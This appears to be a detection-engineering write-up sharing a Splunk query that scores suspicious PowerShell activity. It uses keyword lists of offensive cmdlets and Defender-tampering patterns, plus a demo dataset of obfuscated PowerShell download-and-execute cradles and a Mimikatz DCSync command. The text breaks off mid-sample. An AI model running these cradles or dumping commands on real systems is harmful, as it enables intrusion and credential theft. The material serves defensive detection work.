# How to detect suspicious PowerShell activity with Splunk?
The following SPL snippet comes from one of the [Splunk Hyper Queries](https://ateixei.medium.com/siem-hyper-queries-introduction-current-detection-methods-part-i-ii-13330b5137df) I use to score/rate suspicious endpoint sessions. Most of the checks are done using [eval's match()](https://docs.splunk.com/Documentation/SCS/current/SearchReference/ConditionalFunctions#match.28.26lt.3Bstr.26gt.3B.2C_.26lt.3Bregex.26gt.3B.29) and they can be applied to pretty much any endpoint telemetry, including EDR, Sysmon (EID 1) and Windows 4688/4104 log events.

The idea is to quickly share some real-life SPL with the Splunk Detection Engineering community. Have fun and don't forget to refer to author/references below if using these ideas/code somewhere. Feedback always welcome!

![image](https://user-images.githubusercontent.com/14159692/122783727-1bf53b00-d2b2-11eb-8ccf-5049d1b3129e.png)

## A few notes

- Some checks rely on long regex strings aiming to detect a wide range of activities, you may want to split those into smaller subsets for your environment for easier maintenance and fine-grained scoring.
- While some of those checks indicate very suspicious activity, relying on atomic indicators is by far what contributes towards high alert volume  and low signal-to-noise.
- Of course, depending on how PowerShell is used within an environment, those may require some initial exception handling/baseline analysis until the noise is reduced to a manageable amount.
- The single score related to each qualifier must be fine-tuned for each environment. You can extract and calculate scores later via [eval's mvfilter()](https://docs.splunk.com/Documentation/Splunk/8.2.0/SearchReference/MultivalueEvalFunctions#mvfilter.28X.29) and [eventstats](https://docs.splunk.com/Documentation/Splunk/8.2.0/SearchReference/Eventstats) sum() and median().

# SPL: PowerShell qualifiers (indicators/observables)
The idea here is to accumulate the *qualifier*, the score for each qualifier and the commandline/log matched and later calculate an overall score/severity range which will either generate an alert or populate a Threat Hunting Leads Dashboard, more details on the scoring system will be available from the blog series linked above.

Basically, scores higher than 5 are considered strong indicators (highlighted in the landing/hunting dashboard) while anything below 3 are basically observables (I'm not writing a Scientific paper for this!).

```
| eval _comment="At this poiint, field ps_command should hold PowerShell related command lines (one-liners, script blocks)"
| eval _comment="Field ParentPath and ChildPath should hold the parent and child process full/absolute paths"

| eval ps_command=replace(ps_command, "[\r\n]", "")
| eval ps_command=replace(ps_command, "\S+\\\(pwsh|sqlps|sqltoolsps|powershell|powershell_ise)\.exe|^(pwsh|sqlps|sqltoolsps|powershell|powershell_ise)(\.exe)*", "")

| eval obf_symbol=ps_command
| makemv tokenizer="(['@%^,;:=&+\"\(\{\)\}`!\*\./\?_\[\]\|<>~$])" obf_symbol
| eval obf_symbol_count=mvcount(obf_symbol)
| eval nonobf_symbol=replace(ps_command, "\s", "")
| makemv tokenizer="([^'@%^,;:=&+\"\(\{\)\}`!\*\./\?_\[\]\|<>~$])" nonobf_symbol
| eval nonobf_symbol_count=mvcount(nonobf_symbol)

| eval ps_len=len(ps_command)
| eval ratio=(nonobf_symbol_count/obf_symbol_count)
  
| eval qualifier="PS: Highly obfuscated command (ratio: ".ratio." ps_len: ".ps_len.")", qualifiers=if(ps_len>100 AND ratio<3, mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 9", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Suspicious cmdlet", qualifiers=if(match(ps_command, "(?i)Add-Exfiltration|Add-Persistence|Add-RegBackdoor|Add-ScrnSaveBackdoor|Check-VM|Do-Exfiltration|Enabled-DuplicateToken|Exploit-Jboss|Find-Fruit|Find-GPOLocation|Find-TrustedDocuments|Get-ApplicationHost|Get-ChromeDump|Get-ClipboardContents|Get-FoxDump|Get-GPPPassword|Get-IndexedItem|Get-Keystrokes|LSASecret|Get-PassHash|Get-RegAlwaysInstallElevated|Get-RegAutoLogon|Get-RickAstley|Get-Screenshot|Get-SecurityPackages|Get-ServiceFilePermission|Get-ServicePermission|Get-ServiceUnquoted|Get-SiteListPassword|Get-System|Get-TimedScreenshot|Get-UnattendedInstallFile|Get-Unconstrained|Get-VaultCredential|Get-VulnAutoRun|Get-VulnSchTask|Gupt-Backdoor|HTTP-Login|Install-SSP|Install-ServiceBinary|Invoke-ACLScanner|Invoke-ADSBackdoor|Invoke-ARPScan|Invoke-AllChecks|Invoke-BackdoorLNK|Invoke-BypassUAC|Invoke-CredentialInjection|Invoke-DCSync|Invoke-DllInjection|Invoke-DowngradeAccount|Invoke-EgressCheck|Invoke-Inveigh|Invoke-InveighRelay|Invoke-Mimikatz|Invoke-Mimikittenz|Invoke-NetRipper|Invoke-NinjaCopy|Invoke-PSInject|Invoke-Paranoia|Invoke-PortScan|Invoke-PoshRat|Invoke-PostExfil|Invoke-PowerDump|Invoke-PowerShellTCP|Invoke-PowerShellWMI|Invoke-PsExec|Invoke-PsUaCme|Invoke-ReflectivePEInjection|Invoke-ReverseDNSLookup|Invoke-RunAs|Invoke-SMBScanner|Invoke-SSHCommand|Invoke-Service|Invoke-Shellcode|Invoke-Tater|Invoke-ThunderStruck|Invoke-Token|Invoke-UserHunter|Invoke-VoiceTroll|Invoke-WScriptBypassUAC|Invoke-WinEnum|Invoke-WmiCommand|MailRaider|New-HoneyHash|Out-Minidump|Port-Scan|PowerBreach|PowerUp|PowerView|Remove-Update|Set-MacAttribute|Show-TargetScreen|Start-CaptureServer|VolumeShadowCopyTools|--NEEEEWWW--|(Computer|User)Property|CachedRDPConnection|get-net\S+|invoke-\S+hunter|Install-Service|get-\S+(credent|password)|remoteps|Kerberos.*(policy|ticket)|netfirewall|Uninstall-Windows|Verb\s+Runas|AmsiBypass|nishang|Invoke-Interceptor|EXEonRemote|NetworkRelay|PowerShelludp|PowerShellIcmp|CreateShortcut|copy-vss|invoke-dll|invoke-mass|out-shortcut|Invoke-ShellCommand|PSDrive|-adgroupmember|-ADUser|SocksProxy|-attack|WdigestDowngrade|DNSDiscovery|ProcessScan|-Vnc|-autoruns|LoginPrompt|sharefinder|mount\s+|-ADDomain|-ADComputer|-gppp|-smb\S+brute|-nightmare|-PSRemoting|-CimSessionOption") AND !match(ps_command, ps_command_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 8", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Web Client traces"
| eval qualifiers=if(match(ps_command, "(?i)RestMethod|[\.-]webclient|WebRequest|Net\.Socket|InternetExplorer\.Application|XmlHttp|(curl|iwr)\s+") AND !match(ps_command, "(?i)".ps_command_exception_regex) AND !match(ParentPath, "(?i)".ps_parent_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 8", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: System.Mgt usage", qualifiers=if(match(ps_command, "(?i)(system\.management\.automation)") AND !match(ParentPath, "(?i)".ps_parent_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 7", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Mailbox manipulation", qualifiers=if(match(ps_command, "(?i)(Mailbox)") AND !match(ParentPath, "(?i)".ps_parent_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 8", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Highly suspicious keywords", qualifiers=if(match(ps_command, "(?i)(bitstransfer|mimik|metasp|AssemblyBuilderAccess|Reflection\.Assembly|shellcode|injection|cnvert|shell\.application|start-process|FromBase64String|Rc4ByteStream|System\.Security\.Cryptography|lsass|localadmin|LastLoggedOn|hijack|BackupPrivilege|ngrok|comsvcs|backdoor|brute.?force|Port.?Scan|Exfiltration|exploit|beacon|-dump|SeTcbPrivilege|kerberoast)") AND !match(ps_command, "(?i)".ps_command_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 8", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Download reference", qualifiers=if(match(ps_command, "(?i)[^\\\]download") AND !match(ps_command, "(?i)".ps_command_exception_regex) AND !match(ParentPath, "(?i)".ps_parent_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Script reference", qualifiers=if(match(ps_command, "(?i)\.(vbs|wsf)|wscript|javascript") AND !match(ParentPath, "(?i)".ps_parent_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: WMI usage", qualifiers=if(match(ps_command, "(?i)wmiobject|WMIMethod|RemoteWMI|PowerShellWmi|wmicommand|(iwmi|gwmi)\s+") AND !match(ParentPath, "(?i)".ps_parent_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Potential long base64 string", qualifiers=if(match(ps_command, "(?i)[a-z0-9+/=]{60}") AND !match(ParentPath, "(?i)".ps_parent_exception_regex) AND !match(ps_command, "(?i)".ps_command_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Overly long command", qualifiers=if(ps_len>320 AND ratio>48, mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 5", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Nested LOLBin", qualifiers=if(match(ps_command, "(?i)(rundll32|regsvr32|cmd)\.exe"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: HTTP/S/FTP usage", qualifiers=if(match(ps_command, "(?i)(https*|ftp):") AND !match(ps_command, "(?i)".ps_command_exception_regex) AND !match(ParentPath, "(?i)".ps_parent_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Eventlog/ETW manipulation", qualifiers=if(match(ps_command, "(?i)(eventlog|\.evtx|EventLog-App|-etwtrace)"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers) 
| eval qualifier="PS: Fairly suspicious keywords", qualifiers=if(match(ps_command, "(?i)DisableRealtimeMonitoring|token|password|dump|Obfuscation|sploit|scanner|rundll|Reflection|Invoke-Command|icm\s+|	
Invoke-Expression|iex\s+|base64|discover-|github|Get-WinSystemLocale|-Expression|Set-Wallpaper|-PSSession|etsn\s+.+ComputerName|(start|get)-Service.+ComputerName|gsv\s+.+ComputerName|get-Credential|Stop-Process|kill\s+|(ps|Get-Process)\s+.+ComputerName") AND !match(ps_command, "(?i)".ps_command_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 4", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Remote command", qualifiers=if(match(ps_command, "(?i)\s+-ComputerName\s+[^.\s]") AND !match(ps_command, "(?i)".ps_command_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Invoke command", qualifiers=if(match(ps_command, "(?i)(invoke[-])") AND !match(ParentPath, "(?i)".ps_parent_exception_regex) AND !match(ps_command, "(?i)".ps_command_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 2", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: EncodedCommand", qualifiers=if(match(ps_command, "(?i)[-]e(nc*o*d*e*d*c*o*m*m*a*n*d*)*\s+[^-]"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 2", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Attempt to disable MS Defender", qualifiers=if(match(ps_command, "(?i)(set|add)-MpPreference.+disableRealtimeMonitoring|disable(intrusionpreventionsystem|IOAVProtection|ScriptScanning)|(EnableControlledFolderAccess|MAPSReporting)\s+Disabled|SubmitSamplesConsent\s+NeverSend"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 9", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Potential Downgrade Attack", qualifiers=if(match(ps_command, "(?i)([-]ve*r*s*i*o*n*\s+2)"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Notable [char] usage", qualifiers=if(match(ps_command, "(?i)(convert|byte|length|xor|substring|join|toint|tostr)*.*\[char.*(convert|byte|length|xor|substring|join|toint|tostr)*"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 7", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Service Manipulation", qualifiers=if(match(ps_command, "(?i)(new|set)-service"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 8", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Task Manipulation", qualifiers=if(match(ps_command, "(?i)ScheduledTask"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 8", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Compressed File manipulation", qualifiers=if(match(ps_command, "(?i)GZipStream|::Decompress|IO.Compression|(expand|compress)-Archive|-7*zip"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Alternative PowerShell executed", qualifiers=if(vendor_event=="exec" AND match(ChildPath, "(pwsh|sqlps|sqltoolsps)\.exe$") AND !match(HostName, "(?i)PLACEHOLDER") AND !match(ParentPath, "(?i)[\\\]PLACEHOLDER"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: ".(6), cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Windows Service manipulation", qualifiers=if(match(ps_command, "(?i)(start|get)-Service") AND !match(ps_command, "(?i)".ps_command_exception_regex) AND !match(ParentPath, "(?i)".ps_parent_exception_regex), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 6", cmdlines." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Uncommon external network activity", qualifiers=if(vendor_event=="socket" AND ps_exe==1 AND isnotnull(coalesce(external_domain_risky, external_ip)) AND !match(external_domain_risky, "(?i)PLACEHOLDER"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: ".(9), time_label."[".ChildHash."]: ".ChildPath."->".coalesce(external_domain_risky, external_ip).":".Port." ".Protocol." (".qualifier.")"), qualifiers)
| eval qualifier="PS: External network activity towards a common domain", qualifiers=if(vendor_event=="socket" AND ps_exe==1 AND domain_prevalence=="high_prevalence" AND !match(external_domain_risky, "(?i)PLACEHOLDER"), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: ".(5), time_label."[".ChildHash."]: ".ChildPath."->".coalesce(external_domain_risky, external_ip).":".Port." ".Protocol." (".qualifier.")"), qualifiers)
| eval qualifier="PS: Internal network activity", qualifiers=if(vendor_event=="socket" AND ps_exe==1 AND special_ip==0 AND ((isnull(coalesce(external_domain, external_ip)) AND isnotnull(IP)) OR (ut_domain=="None" AND isnotnull(Hostname))), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: ".(4), time_label."[".ChildHash."]: ".ChildPath."->".coalesce(Hostname, IP).":".Port." ".Protocol." (".qualifier.")"), qualifiers)
| eval qualifier="PS: PowerShell activity", qualifiers=if(ps_exe==1 AND !match(qualifiers, "PS: "), mvappend(qualifiers, "[".session_label."] ".qualifier." # score: 0.5", cmdlines." (".qualifier.")"), qualifiers)
```
## What can be done next?
You may perform the following checks not covered here, mainly around anomaly detection/baseline analysis for a more robust, less FP-prone detection:

- Is the command making reference to a new script (ps1/psd1/etc) NOT seen before (baseline)?
- Is the command length higher than X and NOT part of the baseline?
- Is the command executed from a parent NOT part of the baseline?

For creating the baseline, no fancy machine learning needed, simply stack counting via stats command, saving results to a MV-field enabled lookup which is consumed by yet another qualifier check (detection component/feature).

# Demo Dataset

![image](https://user-images.githubusercontent.com/14159692/123107067-7cfb4b00-d439-11eb-89e2-701d320819f9.png)

Here's a quick SPL to generate PowerShell one-liners as example. Those are particularly useful to validade the obfuscation detection method. They are mainly coming from an article wrote by  Liam Cleary [here](https://www.helloitsliam.com/2018/03/21/obfuscating-powershell-commands/).

```
| makeresults
| eval src="developer", command="Get-Process {process-name} | format-list *"

| append [ | makeresults | eval src="dummy1", command="Get-LocalUser -SID S-1-5-2" ]
| append [ | makeresults | eval src="dummy1", command="Get-WmiObject -ComputerName workstation1 -Class Win32_UserAccount -Filter \"LocalAccount=True\"" ]
| append [ | makeresults | eval src="dummy1", command="Select PSComputername, Name, Status, Disabled, AccountType, Lockout, PasswordRequired, PasswordChangeable | Out-GridView" ]

| append [ | makeresults | eval src="legacy1", command="-version 2 -noprofile -command \"(Get-Item ([PSObject].Assembly.Location)).VersionInfo | fl\"" ]
| append [ | makeresults | eval src="legacy1", command="-noprofile -command \"(Get-Item ([PSObject].Assembly.Location)).VersionInfo | fl\"" ]
| append [ | makeresults | eval src="legacy1", command="-version 2 -noprofile -command \"(Get-Item (Get-Process -id $pid -mo | ? { $_.FileName -match 'System.Management.Automation.ni.dll' } | % { $_.FileName })).VersionInfo | fl\"" ]

| append [ | makeresults | eval src="netadmin", command="Get-NetTCPConnection –State Established" ]
| append [ | makeresults | eval src="netadmin", command="Get-Process {process-name} | format-list *" ]
| append [ | makeresults | eval src="netadmin", command="Get-CimInstance win32_service -Filter \"startmode = 'auto'\"" ]

| append [ | makeresults | eval src="secadmin", command="Get-WinEvent -LogName \"Security\",\"System\",\"Application\"" ]
| append [ | makeresults | eval src="secadmin", command="ForEach ($Group in (Get-ADGroup -Filter *)) { Get-ADGroupMember $Group | Select @{Label=\"Group\";Expression={$Group.Name}},Name,SamAccountName }" ]
| append [ | makeresults | eval src="compromised1", command="-exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt\"" ]

| append [ | makeresults | eval src="compromised", command="Invoke-Expression (New-Object Net.WebClient).\"`D`o`wn`l`oa`d`Str`in`g\"(‘htt’ + ‘ps://’ + ‘bit.ly/sample’)" ]
| append [ | makeresults | eval src="compromised", command="Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:demodomain /user:sqladmin\"'" ]

| eval _comment="Medium"

| append [ | makeresults | eval src="compromised2",  command="Invoke-Expression (New-Object Net.WebClient).\"`D`o`w`N`l`o`A`d`S`T`R`i`N`g\"(‘htt’ + ‘ps://’ + ‘bit.ly/sample’)" ]

| eval _comment="Hard"

| append [ | makeresults | eval src="compromised3",  command="`I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N (& (`G`C`M *w-O*) \"`N`e`T`.`W`e`B`C`l`i`e`N`T\").\"`D`o`w`N`l`o`A`d`S`T`R`i`N`g\"( ‘ht’+’tps://bit.ly/sample’)" ]

| eval _comment="ASCII Encoding"

| append [ | makeresults | eval src="compromised4",  command="[StRiNg]::JoIn( \" , [ChaR[]](73, 110, 118 ,111,107,101, 45 , 69, 120 ,112, 114 , 101, 115 ,115 , 105,111, 110,32,40,78 , 101 ,119, 45, 79 , 98 ,106 , 101 , 99 ,116, 32 , 83, 121,115 , 116, 101,109 , 46 , 78 , 101 ,116, 46,87,101, 98 ,67 ,108,105,101 , 110, 116,41 , 46, 68 , 111 , 119, 110 ,108 ,111, 97,100 ,83 , 116 , 114, 105 ,110, 103, 40 ,39, 104 ,116 , 116, 112 ,58,47,47 ,98 , 105,116,46 , 108 , 121, 47 , 115, 97, 109 , 112,108, 101 ,39, 41 ))|& ((gv '*MDr*').NamE[3,11,2]-joiN\")" ]

| eval _comment="Hex Encoding"

| append [ | makeresults | eval src="compromised4",  command="&( $sHeLlId[1]+$SHeLLiD[13]+'x')(( ( 49, '6e' , 76, '6f','6b', 65,'2d',45 , 78, 70, 72,65 , 73, 73,69, '6f' , '6e' ,20,28,'4e' ,65 , 77, '2d', '4f' ,62, '6a', 65,63 ,74 , 20 , 53 , 79,73 ,74,65,'6d','2e','4e' , 65 ,74 , '2e' , 57,65, 62,43,'6c' ,69, 65,'6e', 74,29 ,'2e', 44 , '6f' , 77, '6e','6c' , '6f' ,61, 64, 53,74 , 72 ,69 , '6e' , 67, 28, 27, 68 , 74,74, 70 , '3a' , '2f' , '2f',62 , 69, 74 ,'2e' , '6c', 79,'2f' ,73, 61 , '6d' , 70 ,'6c',65, 27, 29)|foreAcH-objeCt {([COnvERT]::tOiNT16(( $_.TOSTrinG()), 16 )-as [chAR])} ) -JOin \")" ]

| eval _comment="SecureString (AES) Encoding"

| append [ | makeresults | eval src="compromised5",  command=".( $PsHOMe[4]+$PsHoMe[34]+\'x\')(([ruNtiMe.inteROpseRViCes.MaRsHaL]::ptRtoStRinGuNi( [RuNTime.iNTERoPservIcES.marSHAL]::SecureStrinGToGLoBalaLLocuniCoDE($(\'76492d1116743f0423413b16050a5345MgB8AG0ARwBnAEEAUgBGAE8AMwB6AGsAbABPAEUAcgBNADEATgB5AHMAZAB2AGcAPQA9AHwAMwAxADgAZgBkADQAOABmADQAYQA2AGUAMgBjADkAOQA0AGYAZgAxADQAZQBhADcANwBkAGQAMwBmADgAZgAyAGUAMABkAGQAMAA1ADUANgA3AGMAYgA3AGUAOQBlADYAOQBmAGYAZABjADEANgBhADYAMwA0AGIANgA3ADQAYwBlAGQAMwAxAGUAZgAxADEANAA0ADIAMABkADgANgA0AGIAOABjAGUAOABkAGYAMgAyAGMAZAA1AGMAZgAzADYAOABmADAAYwA5AGQAYQA1ADAAYwA4AGQAMABiAGIANAA4ADcAYQAzADUAYwBlADAAZAA1AGYAYwAxAGQANQBjAGEAZgBiADYAYwAxADYAZQBlAGUAMgA0ADMANwA1AGYAOABhADkAZAA1AGQAZgBjADAAMAAyADQANwBiAGIAMABmADcAOQA4AGYAMQA0ADkAZAA3AGUAMwBmADgAMQBiADMAOAA5ADUANgAzADcAYQA0AGEAOQBhAGIANAA1ADgAZgBmAGYAMQAzADQAYgA0ADcAMAA4ADcAMQA0ADIAZQBkADIANwBjADQAMAAzAGQAMgA4AGQAZgAzAGQAZQBkADYAMABjADMAMQBlADkAMgBlAGMANABiAGQAZQBkADMAMAA5AGEAMwA0ADYAZABhADkAZQBlADcAZgBlADQAMQA3AGUAZQA0ADAAMgA4AGIAMgAzAGIAYwA5ADUANQA4AGQAMwA4AGIAYwAwADQAMQBiAGIAZABjADQAMABlADgAZAA4ADYAZgA1AGYAMwAwAGYANAAxADAAOAA4ADAAYQA2AGEAZQAxADgAZgA0ADkAZAA1ADYAMgA3AGIAZQA2ADAAZgAzADQANwAzAGYAYgAxAGUAZQBmADMAMAA3AGEANAA0ADYANwA5ADcAOQAwAGYAYwA5ADcANAAwADUAMQA5ADUAMQA3AGYAYwA5ADEAOAA5ADIAYgBjAGIANgAxADEANgA2ADEAZgBiADkANQA3ADcAZgAxADQAZQA4ADIA\'| cOnVeRTTo-secUrestRING -KE (242..227)) )) ))" ]

| eval _comment="SecureString (AES) Encoding Compressed"

| append [ | makeresults | eval src="compromised5",  command="(new-oBJect iO.COMPRESsiOn.deflATESTreAM( [Io.MEMoRyStreAm][SYStEm.convert]::FROmbASE64stRing(\'RVRdb+JADPwreThdQVURgdBe++Y0Kxodm3SBVAqIhzbNBcrXKdCGov7483i3OvEA3rU9nhkvXsub1++7Y6zLTrybqjr9Oynrp1VRHjpbGh+WtFnc3bXm4yzhHNWJk6kap4+HcoycSUcj53m06AzVUZfbUNWTVnseLDoJbVWbWz6lv0vGGGeMsWWM5FiOGUPVH/E9Y2iqDw80YoyJKt5rNZnWq2Q43VebNKQRjTb7Itutiv2rank/Whc318Ft79X3/euboP+nG/T6gd9/8a+7g+7zoB8MdBX+IpVRVtGAhjklFD6TCqig8BPnLyb8oGFFMwp7pDSVJrwmZWjShJoeCno0dEsPDaUUblGfG+pTZEg3iBXlDZ0pirmeTjTMaGbCJUWEc84rSBN1UZcazo80zSrOi3LO43uuT4h6NNTcD/kxaUM++iToF60pqYBjKK/okyKF7wb1msI1cLhfH3ncf4X7WcXnnC/1jDtz9UkFHOnfR8zfJ9QnMl/s+og+a5mnwrkG3x5FGfMJ35x+K8zN+YGraySW8ww6cJ8KeGfpVzkdDGLghRvcp+AJ3WTuAvxPdm7EBN3Oljf0lPkHwOP7pcxPPA/6GZ5D9ESdRv4a/bXooGxf6Eisn9W5i3jm+qTCPwPPrtUL9wQeZ8Sc3zifTsBnXwPRobL1lnfuzuEv5sotP455PvGLz7918+3+IJ99bqAH85K9yTFPz+Kij8Jc//MjY/lxnewj9sA43Z1/rMNGzuE3dDDWt9xYHWbiS4H5GsSMswQv0YHxEmP1T2X/Kudv5vxbu7lj+BNgL2SPwNu4PRC/vt+Bhi490a9x/VAnuqF+jfOu3Bv2F/tiLP/UuL0BLxs38j5Ex9i+Q9v3DJzU7bHsLd6D8DHuXRr3XnL7Drhv4nxOoRf2wlg+7OvGzf8mvjg/L7wv736/+1Dj43F/dVD3WV0epnW8G3pX69LzWjeDTicI2m2PP23v66fHf0+HZbkZxdHcX1y6369zv7+4vDhdtP8B\'), [iO.CoMPresSiON.cOMPresSIoNmoDE]::dEcoMPreSs) |fOrEAch{ new-oBJect Io.sTREAmReadER($_ ,[SYSteM.tExT.eNcODinG]::AsciI) } ).readtoEND( ) | & ( ([sTRInG]$VErBOSeprEFerENCE)[1,3]+\'x\'-Join”)" ]

| append [ | makeresults | eval src="compromised6", command="-encodedCommand IFtTeXN0ZW0uTmV0LldlYkNsaWVudF0kd2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDtbU3lzdGVtLklPLlN0cmVhbV0kc3RyZWFtID0gJHdlYkNsaWVudC5PcGVuUmVhZCgnaHR0cHM6Ly81LnRvcDR0b3AubmV0L3BfMTM3MmhjNWp2MS5qcGcnKTtbU3lzdGVtLklPLlN0cmVhbVJlYWRlcl0kc3IgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIgLWFyZ3VtZW50TGlzdCAkc3RyZWFtO1tzdHJpbmddJHJlc3VsdHMgPSAkc3IuUmVhZFRvRW5kKCk7SUVYICRyZXN1bHRzOyBkZWZlbmRlcg==" ]
| append [ | makeresults | eval src="compromised6", command=" . ((vaRIABLe '*MDr*').naME[3,11,2]-JOIn'')( [StRiNg]::JOIN('',( [cHar[]]( 57 , 110, 32 ,83,120,106 , 48 ,82,127 , 119 ,120, 126 , 105, 61 , 84 , 82, 51 ,80 , 120 ,112, 114 ,111, 100,78, 105,111,120,124, 112 , 53 ,49 , 70, 94, 114 ,115, 107 , 120 , 111,105, 64 , 39 ,39 ,91, 111 , 114 , 112,95 ,124 ,110, 120,43, 41 , 78 , 105 ,111 ,116 ,115,122 ,53, 63, 85 ,41,110 , 84 , 92,92, 92 ,92 ,92,92 ,92 , 92, 92 ,86,44 ,69, 43,41 , 54 ,116 , 78 ,117, 127, 50, 46,77,41 , 75,123 , 82, 117, 88,119 ,69,68 , 46 , 116,80 ,50 ,71 , 73 ,85 , 87 , 91 , 72 ,88, 95 ,88 , 95, 127 ,69 , 75, 107 , 109 , 45, 82, 76 ,114 ,88 ,114 ,127,106 ,114 , 75 ,42 , 37, 103 , 50 , 123 , 122,54 ,114, 123,69 ,105 ,47 ,120 ,115 , 68 ,115 , 47,73 , 72, 117 , 75 , 117 ,69 ,115 , 54 ,73, 104 , 77 , 82, 108, 122 ,84,77 ,43 ,122, 41 ,110, 115 ,72,37 , 37 , 122, 44, 88 , 77,94 ,101, 76 ,91 , 83 , 104,54, 79 ,36, 76,86,117 ,69,107,74 , 91 ,103 , 89 , 101, 113,123 , 116 ,119 ,74 , 89,92, 73, 73 , 37, 123, 71, 126 , 127 , 71,41,110, 101 ,95 ,54,94, 100,87 , 123, 123 ,36, 80 ,80 , 84,45 ,87 ,101 , 73, 77 , 101 , 75,104 ,87, 105 ,114,118, 120 ,68 , 78, 109 , 123,104 ,89,91 , 111,47, 40 ,107 ,109,88, 41, 108,88, 111 ,118,112,41, 106, 76 ,90 ,72, 112,88,100 ,115 ,121 ,46,117,127 , 107,37 ,86 ,77, 91 , 116, 103 ,72, 79,107, 115,114,127 , 105,92 ,46 , 109,103, 88,121, 42 , 43 ,79 ,122, 100,86 , 78 ,116, 50 ,121,84 , 90 , 95, 36 ,75,42 , 82 , 36 , 44, 100, 36 ,123 ,120,118 , 118,72 , 84,76, 36,123 , 36, 114 , 37 , 89, 117, 81,105, 101,119 ,83,100 ,83,68 , 43,82 ,41 , 75, 94 , 124 ,54, 88 ,126 ,36 ,127 , 91, 86 , 90 , 85,37 , 74,124 , 85 , 121 , 88 , 103 , 37 , 79, 121 , 100 , 50, 77, 76,41 , 126,123,43,80, 40, 75 , 42,86 ,45, 109 , 54 , 113, 127 ,126,86 , 119 ,111,90 ,121 , 118, 42 ,100 , 121 ,120, 44 ,103 , 84, 83, 85, 83 ,69, 95, 110,69, 94,111,54 ,54 ,74 , 120,101 ,50,77 , 87, 92, 107,73 ,40,100, 68 , 124,84 ,40 , 126,124 , 112 , 114 , 109, 119 , 91,90 ,42 ,108 , 77 ,117,82 ,80,72 , 100 , 37,127 ,47 , 126,86 , 71,100 , 113 ,92 ,78 ,114,75,79 ,42,68 ,120 ,54 , 127 , 91 ,107, 41 , 110 , 121,115 , 47 ,43 ,83, 111 , 119,50 , 77, 126 ,120, 119 , 118, 46 , 123, 115, 78,101 , 107, 75 ,116,54,120 ,112 ,68 ,91, 90, 107 , 119, 101 ,124 , 100 ,126, 103,108,79, 120 ,120 ,72 ,117 , 90, 74 , 88, 37 ,94, 112,120 , 37 ,90 ,106 ,74 ,94,75 , 120,80 ,115 , 45, 107 ,111, 43,50,88 ,85,54,50 ,74,86, 84,112 ,85 ,127,79 , 126 ,36, 94, 117,40,90 , 118, 79, 54 ,114,86 ,89,111 ,68 , 82 ,114,114 , 123 , 120,126, 45 ,103,85 , 86 , 76, 122 , 88 ,36, 116 ,86,80, 68 , 73,77, 110, 41, 109,113 ,80, 94 ,87 